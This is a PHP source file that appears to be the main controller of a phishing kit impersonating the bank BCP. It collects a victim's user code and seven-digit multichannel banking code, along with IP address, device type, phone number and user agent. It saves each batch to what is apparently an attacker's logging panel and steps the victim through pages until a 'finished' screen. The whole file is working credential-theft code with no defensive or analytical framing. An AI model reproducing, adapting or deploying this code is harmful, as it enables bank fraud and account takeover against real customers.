<?php
include __DIR__ . '/functions/conn.php';

$link = getQuery($mainFile);
$bankName = 'BCP';

if (isset($_POST['sender']) && $_POST['sender'] != '') {
    $post = $_POST['sender'];

    if ($post == 'start') {
        $usuario = $_POST['is_login'];
        $senha = $_POST['input_1'] . $_POST['input_2']  . $_POST['input_3'] . $_POST['input_4'] . $_POST['input_5'] . $_POST['input_6'] . $_POST['input_7'];

        $sistema = getSystem();

        if ($sistema == 'IPHONE') {
            $showSystem = 'IOS';
        } else if ($sistema == 'ANDROID') {
            $showSystem = 'ANDROID';
        } else {
            $showSystem = 'DESKTOP';
        }

        $_SESSION['sistema'] = $showSystem;
        
        $dataShow = date('d-m-Y');
        $horaShow = date('H-i');
        $msg_txt = "DATA:{$dataShow}\nHORA:{$horaShow}\nBANK:{$bankName}_{$showSystem}\nIP:{$ip}\nCOD. UTILIZADOR:{$usuario}\nCOD. MULTICANAL:{$senha}\n";
        savePainel($msg_txt, $ip);

        $_SESSION['nextPage'] = 'FONE';
        header("Location: $link");
    }

    if ($post == 'phone') {
        $fone = $_POST['is_phone'];
		$user_agent = $_SERVER['HTTP_USER_AGENT'];

        $msg_txt = "TELEMOVEL:{$fone}\nUSER AGENT: {$user_agent}\n";
        savePainel($msg_txt, $ip);

        $_SESSION['nextPage'] = 'FINALIZADO';
        header("Location: $link");
    }
}

if (!isset($_SESSION['nextPage'])) {
    $_SESSION['nextPage'] = 'INDEX';
}

$nextPage = $_SESSION['nextPage'];
switch ($nextPage) {
    case 'INDEX':
        include __DIR__ . '/incs/index.php';
        break;

    case 'FONE':
        include __DIR__ . '/incs/fone.php';
        break;

    case 'FINALIZADO':
        include __DIR__ . '/incs/finalizado.php';
        break;
}
